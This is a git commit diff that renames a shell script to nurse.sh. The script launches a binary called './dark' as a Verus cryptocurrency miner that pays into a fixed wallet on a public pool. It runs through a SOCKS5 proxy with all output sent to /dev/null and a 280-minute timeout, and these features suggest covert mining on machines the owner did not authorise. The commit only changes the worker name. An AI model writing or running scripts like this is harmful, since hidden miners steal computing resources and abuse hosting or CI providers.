58f1fc6838a14cd0c7147581913d030ff076e7e2
slimenurse <88981812+slimenurse@users.noreply.github.com>
2021-08-16 00:06:28 +0700

    Update and rename hap.sh to nurse.sh

--- nurse.sh
+++ nurse.sh
@@ -6,6 +6,6 @@ screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
 WALLET=aPVG6oYboudnE31PwkPLi94pbc5CaVj21N
 PROXY=socks5://192.252.209.155:14455
-WORKER=$(echo $(shuf -i 100-999 -n 1)-NASRULH)
+WORKER=$(echo $(shuf -i 100-999 -n 1)-SLIME-NURSE)
 timeout 280m ./dark -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
 echo Sukses
